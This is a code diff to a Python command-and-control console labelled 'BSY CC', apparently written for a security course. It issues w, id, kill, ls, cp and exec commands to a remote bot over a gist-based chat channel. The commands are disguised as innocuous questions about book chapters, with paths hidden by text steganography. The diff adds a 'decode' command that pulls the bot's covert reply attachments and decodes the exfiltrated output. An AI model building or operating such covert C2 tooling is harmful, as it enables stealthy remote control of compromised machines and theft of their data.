@@ -2,12 +2,15 @@ import sys
 import uuid
 
 sys.path.append('..')
-from common.utils import add_message, check_chat_file
+from common.utils import add_message, check_chat_file, get_reply_to_msg_id, read_attachment
 from common.utils import CONTROLLER_NICK_NAME
 from common.gist import init_gist
 from common.chapters import get_chapter_for_path_encoding, get_chapter_for_command, read_chapter
-from common.steganography import encode_to_text
+from common.steganography import encode_to_text, decode_from_text
 
+
+# TODO - check maximum sizes of encoded messages
+# TODO - heartbeat
 
 def encode_path(pth):
     chapter_for_encoding = get_chapter_for_path_encoding()
@@ -25,17 +28,33 @@ def process_cmd(cmd):
     if cmd == 'w' or cmd == 'id' or cmd == 'kill':
         print(f'Adding {cmd} command...')
         chapter = get_chapter_for_command(cmd)
-        add_message(f'Send me text of chapter {chapter}, please', CONTROLLER_NICK_NAME)
+        msg_id = add_message(f'Send me text of chapter {chapter}, please', CONTROLLER_NICK_NAME)
+        print(f'Added {cmd} command as message with id {msg_id}', flush=True)
+
     elif len(cmd_parts) == 2 and (cmd_parts[0] == 'ls' or cmd_parts[0] == 'cp' or cmd_parts[0] == 'exec'):
         print(f'Adding {cmd_parts[0]} command...')
         chapter = get_chapter_for_command(cmd_parts[0])
-        attachment = {
+        attach = {
             'name': str(uuid.uuid4()) + '.txt',
             'content': encode_path(cmd_parts[1]),
         }
-        add_message(f'Is this attachment part of chapter {chapter}?', CONTROLLER_NICK_NAME, attachment=attachment)
+        msg_id = add_message(f'Is this attachment part of chapter {chapter}?', CONTROLLER_NICK_NAME, attachment=attach)
+        print(f'Added {cmd} command as message with id {msg_id}', flush=True)
+
+    elif len(cmd_parts) == 2 and cmd_parts[0] == 'decode' and cmd_parts[1].isdigit():
+        msg_id = int(cmd_parts[1])
+        print(f'Decoding reply for message {msg_id}...')
+        reply = get_reply_to_msg_id(msg_id)
+        if reply is None:
+            print(f'No reply for message {msg_id} found', flush=True)
+        else:
+            text = read_attachment(reply[3])
+            decoded = decode_from_text(text)
+            print(f'Reply for message {msg_id}:')
+            print(decoded, flush=True)
+
     else:
-        print(f'Unknown command: {cmd}')
+        print(f'Unknown command: {cmd}', flush=True)
 
 
 def run():
@@ -46,11 +65,9 @@ def run():
 
     while True:
         cmd = input('BSY CC > ')
-
         if cmd == 'exit' or cmd == 'quit':
             print('Exiting BSY CC...')
             break
-
         process_cmd(cmd)
 
 
